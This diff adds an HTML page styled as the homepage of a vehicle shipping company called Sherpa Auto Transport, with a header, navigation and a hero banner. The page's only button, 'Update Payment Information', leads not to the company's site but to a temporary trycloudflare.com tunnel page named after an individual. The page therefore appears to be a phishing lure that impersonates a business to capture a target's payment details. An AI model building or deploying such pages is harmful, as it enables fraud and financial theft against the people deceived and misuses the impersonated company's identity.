@@ -1,0 +1,169 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Sherpa Auto Transport</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Poppins', sans-serif;
+      background-color: #ffffff;
+      color: #1a1a1a;
+    }
+
+    header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 20px 40px;
+      background-color: #ffffff;
+      border-bottom: 1px solid #eee;
+      z-index: 100;
+      position: relative;
+    }
+
+    .logo {
+      font-size: 24px;
+      font-weight: 700;
+      color: #005288;
+    }
+
+    .contact {
+      font-size: 14px;
+      color: #333;
+    }
+
+    .contact strong {
+      font-weight: 600;
+      color: #000;
+    }
+
+    nav {
+      display: flex;
+      justify-content: center;
+      gap: 30px;
+      background-color: #ffffff;
+      padding: 15px 0;
+      border-bottom: 1px solid #ddd;
+    }
+
+    nav a {
+      text-decoration: none;
+      color: #333;
+      font-weight: 600;
+      font-size: 14px;
+      transition: color 0.3s ease;
+    }
+
+    nav a:hover {
+      color: #005288;
+    }
+
+    .hero {
+      position: relative;
+      background: url('banner.jpg') no-repeat center center;
+      background-size: cover;
+      padding: 120px 20px;
+      text-align: center;
+      color: #fff;
+    }
+
+    .hero::before {
+      content: '';
+      position: absolute;
+      top: 0; left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.5); /* dark overlay */
+      z-index: 0;
+    }
+
+    .hero * {
+      position: relative;
+      z-index: 1;
+    }
+
+    .hero h1 {
+      font-size: 36px;
+      font-weight: 700;
+      margin-bottom: 20px;
+    }
+
+    .hero p {
+      font-size: 18px;
+      max-width: 700px;
+      margin: 0 auto 30px auto;
+    }
+
+    .hero a {
+      display: inline-block;
+      background-color: #005288;
+      color: #fff;
+      text-decoration: none;
+      padding: 14px 30px;
+      font-weight: 600;
+      border-radius: 4px;
+      transition: background-color 0.3s ease;
+    }
+
+    .hero a:hover {
+      background-color: #003f5c;
+    }
+
+    @media (max-width: 768px) {
+      header {
+        flex-direction: column;
+        align-items: flex-start;
+        gap: 10px;
+      }
+
+      nav {
+        flex-wrap: wrap;
+        gap: 15px;
+        padding: 10px 20px;
+      }
+
+      .hero h1 {
+        font-size: 28px;
+      }
+
+      .hero p {
+        font-size: 16px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Header -->
+  <header>
+    <div class="logo">Sherpa Auto Transport</div>
+    <div class="contact">Talk to an expert: <strong>877-850-1231</strong></div>
+  </header>
+
+  <!-- Navigation -->
+  <nav>
+    <a href="#">Reviews</a>
+    <a href="#">Why Sherpa</a>
+    <a href="#">Services</a>
+    <a href="#">Guides</a>
+    <a href="#">Partnerships</a>
+  </nav>
+
+  <!-- Hero Section -->
+  <section class="hero">
+    <h1>The Premier Vehicle Shipping Experience</h1>
+    <p>Sherpa Auto Transport provides the best transport experience with upfront, transparent pricing backed by our Price Lock Promise.</p>
+    <a href="https://restaurant-firewire-once-historical.trycloudflare.com/Sean_Borghei.html">Update Payment Information</a>
+  </section>
+
+</body>
+</html>
